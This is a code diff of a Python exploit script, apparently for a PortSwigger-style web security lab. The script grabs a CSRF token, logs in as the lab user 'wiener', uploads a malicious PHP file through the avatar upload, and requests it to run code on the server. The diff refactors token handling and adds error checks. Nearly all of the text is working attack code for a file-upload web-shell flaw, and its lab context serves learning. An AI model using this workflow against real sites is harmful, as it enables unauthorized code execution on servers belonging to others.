@@ -8,14 +8,7 @@ from requests.utils import requote_uri
 import argparse
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-def get_csrf_and_session_token():
-
-    # Session
-    url = target_url
-    
-    out = r.get(url, verify = False, proxies = proxies)
-    if out.status_code == 200:
-        session_id = out.headers['Set-Cookie'].split(";")[0]
+def get_csrf_token():
     
     # CSRF token
     url = target_url + "/login"
@@ -26,11 +19,12 @@ def get_csrf_and_session_token():
         print("[+] CSRF Token stolen")
     else:
         print("[-] Could not get CSRF token")
-        sys.ext(0)
+        print(out.status_code)
+        sys.exit(0)
 
-    return session_id, csrf_token
+    return csrf_token
 
-def login(session_id, csrf_token, username = "wiener", password = "peter"):
+def login(csrf_token, username = "wiener", password = "peter"):
 
     url = target_url + "/login"
 
@@ -41,7 +35,6 @@ def login(session_id, csrf_token, username = "wiener", password = "peter"):
     }
 
     headers = {
-        'Cookie':session_id,
         'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
     }
 
@@ -53,7 +46,14 @@ def login(session_id, csrf_token, username = "wiener", password = "peter"):
         if out.status_code == 200:
             soup = bs4.BeautifulSoup(out.text, features = "html.parser")
             csrf_token = soup.find('input',{'name':'csrf'}).get('value')
+            print("[+] Got Logged CSRF token")
             return csrf_token
+        else:
+            print("[-] Error getting Logged CSRF token")
+            sys.exit(0)
+    else:
+        print("[-] Error while loggin as wiener")
+        sys.exit(0)
 
 def upload_file(csrf_token):
 
@@ -75,6 +75,7 @@ def upload_file(csrf_token):
     else:
         print("[-] Error uploading file")
         print(out.status_code)
+        sys.exit(0)
     
     # Execute the file by the get request
     url = target_url + "/files/avatars/file_upload.php"
@@ -83,6 +84,10 @@ def upload_file(csrf_token):
     if out.status_code == 200:
         print("[+] Exploited by requesting uploaded malicious file")
         print(out.content)
+    else:
+        print("[-] Error while requesting the malicious file")
+        print(out.status_code)
+        sys.exit(0)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -97,6 +102,6 @@ if __name__ == "__main__":
         'http':'http://127.0.0.1:8080'
     }
 
-    session_id, csrf_token = get_csrf_and_session_token()
-    logged_csrf_token = login(session_id, csrf_token)
+    csrf_token = get_csrf_token()
+    logged_csrf_token = login(csrf_token)
     upload_file(logged_csrf_token)
